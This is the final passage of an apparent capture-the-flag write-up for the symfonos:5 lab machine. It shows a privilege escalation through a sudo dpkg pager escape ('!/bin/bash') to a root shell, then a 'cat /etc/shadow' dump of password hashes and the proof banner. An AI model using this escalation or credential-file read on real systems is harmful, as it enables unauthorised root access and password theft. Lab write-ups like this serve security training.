ii  binutils-common:amd64         2.31.1-16                   amd64        Common files for the GNU assembler, link
ii  binutils-x86-64-linux-gnu     2.31.1-16                   amd64        GNU binary utilities, for x86-64-linux-g
ii  bsdmainutils                  11.1.2+b1                   amd64        collection of more utilities from FreeBS
ii  bsdutils                      1:2.33.1-0.1                amd64        basic utilities from 4.4BSD-Lite
ii  build-essential               12.6                        amd64        Informational list of build-essential pa
ii  busybox                       1:1.30.1-4                  amd64        Tiny utilities for small and embedded sy
ii  bzip2                         1.0.6-9.2~deb10u1           amd64        high-quality block-sorting file compress
ii  ca-certificates               20190110                    all          Common CA certificates
ii  cgroupfs-mount                1.4                         all          Light-weight package to set up cgroupfs
ii  console-setup                 1.193~deb10u1               all          console font and keymap setup program
ii  console-setup-linux           1.193~deb10u1               all          Linux specific part of console-setup
ii  containerd.io                 1.2.10-3                    amd64        An open and reliable container runtime
ii  coreutils                     8.30-3                      amd64        GNU core utilities
ii  cpio                          2.12+dfsg-9                 amd64        GNU cpio -- a program to manage archives
ii  cpp                           4:8.3.0-1                   amd64        GNU C preprocessor (cpp)
ii  cpp-8                         8.3.0-6                     amd64        GNU C preprocessor
ii  cron                          3.0pl1-134+deb10u1          amd64        process scheduling daemon
ii  curl                          7.64.0-4                    amd64        command line tool for transferring data
ii  dash                          0.5.10.2-5                  amd64        POSIX-compliant shell
ii  dbus                          1.12.16-1                   amd64        simple interprocess messaging system (da
ii  debconf                       1.5.71                      all          Debian configuration management system
ii  debconf-i18n                  1.5.71                      all          full internationalization support for de
ii  debian-archive-keyring        2019.1                      all          GnuPG archive keys of the Debian archive
ii  debian-faq                    9.0                         all          Debian Frequently Asked Questions
ii  debianutils                   4.8.6.1                     amd64        Miscellaneous utilities specific to Debi
ii  dictionaries-common           1.28.1                      all          spelling dictionaries - common utilities
ii  diffutils                     1:3.7-3                     amd64        File comparison utilities
ii  dirmngr                       2.2.12-1+deb10u1            amd64        GNU privacy guard - network certificate
ii  discover                      2.1.2-8                     amd64        hardware identification system
ii  discover-data                 2.2013.01.11                all          Data lists for Discover hardware detecti
ii  distro-info-data              0.41+deb10u1                all          information about the distributions' rel
ii  dkms                          2.6.1-4                     all          Dynamic Kernel Module Support Framework
ii  dmidecode                     3.2-1                       amd64        SMBIOS/DMI table decoder
ii  dmsetup                       2:1.02.155-3                amd64        Linux Kernel Device Mapper userspace lib
ii  doc-debian                    6.4                         all          Debian Project documentation and other d
ii  docker-ce                     5:19.03.5~3-0~debian-buster amd64        Docker: the open-source application cont
ii  docker-ce-cli                 5:19.03.5~3-0~debian-buster amd64        Docker CLI: the open-source application
!/bin/bash
root@symfonos5:/home/zeus# id
uid=0(root) gid=0(root) groups=0(root)
root@symfonos5:/home/zeus# whoami
root
root@symfonos5:/home/zeus# date
Sat 08 Jan 2022 12:13:16 PM CST
root@symfonos5:/home/zeus# hostname
symfonos5
root@symfonos5:/home/zeus# cat /etc/shadow
root:$6$LCi0CrNofw.bZNIH$1JzaRFhkZM5zjdzhkcHyRoNluDS2w40H99UpCJCAhjhIyltCRND/7yMqMIyZ77RZwK1VDqk9mwTuZ88eqxSEw.:18297:0:99999:7:::
daemon:*:18264:0:99999:7:::
bin:*:18264:0:99999:7:::
sys:*:18264:0:99999:7:::
sync:*:18264:0:99999:7:::
games:*:18264:0:99999:7:::
man:*:18264:0:99999:7:::
lp:*:18264:0:99999:7:::
mail:*:18264:0:99999:7:::
news:*:18264:0:99999:7:::
uucp:*:18264:0:99999:7:::
proxy:*:18264:0:99999:7:::
www-data:*:18264:0:99999:7:::
backup:*:18264:0:99999:7:::
list:*:18264:0:99999:7:::
irc:*:18264:0:99999:7:::
gnats:*:18264:0:99999:7:::
nobody:*:18264:0:99999:7:::
_apt:*:18264:0:99999:7:::
systemd-timesync:*:18264:0:99999:7:::
systemd-network:*:18264:0:99999:7:::
systemd-resolve:*:18264:0:99999:7:::
messagebus:*:18264:0:99999:7:::
sshd:*:18264:0:99999:7:::
zeus:$6$Q/Ttwr2DXtZboixL$AXcyIXQZ.O1ZQ0iOPhqKdel6Wb5GG3937Il6Dc0aG/yvdtvhp9Ovv0A5lVUXZ5rwUgR5yvXJuLMl1rM7Dx8ke.:18267:0:99999:7:::
systemd-coredump:!!:18264::::::
root@symfonos5:/home/zeus# cd /root
root@symfonos5:~# ls
proof.txt
root@symfonos5:~# cat proof.txt

                    Congrats on rooting symfonos:5!

                                   ZEUS
              *      .            dZZZZZ,       .          *
                                 dZZZZ  ZZ,
     *         .         ,AZZZZZZZZZZZ  `ZZ,_          *
                    ,ZZZZZZV'      ZZZZ   `Z,`\
                  ,ZZZ    ZZ   .    ZZZZ   `V
        *      ZZZZV'     ZZ         ZZZZ    \_              .
.              V   l   .   ZZ        ZZZZZZ          .
               l    \       ZZ,     ZZZ  ZZZZZZ,
   .          /            ZZ l    ZZZ    ZZZ `Z,
                          ZZ  l   ZZZ     Z Z, `Z,            *
                .        ZZ      ZZZ      Z  Z, `l
                         Z        ZZ      V  `Z   \
                         V        ZZC     l   V
           Z             l        V ZR        l      .
            \             \       l  ZA
                            \         C          C
                                  \   K   /    /             K
                          A    \   \  |  /  /              /
                           \        \\|/ /  /
   __________________________________\|/_________________________
            Contact me via Twitter @zayotic to give feedback!

root@symfonos5:~#
```

![11.sudo-l](11.sudo-l.png)

![12.rooted](12.rooted.png)

Rooted.

Basically `sudo dpkg -i` followed by `!/bin/bash`, drops you into the root shell.

</body>
</html>
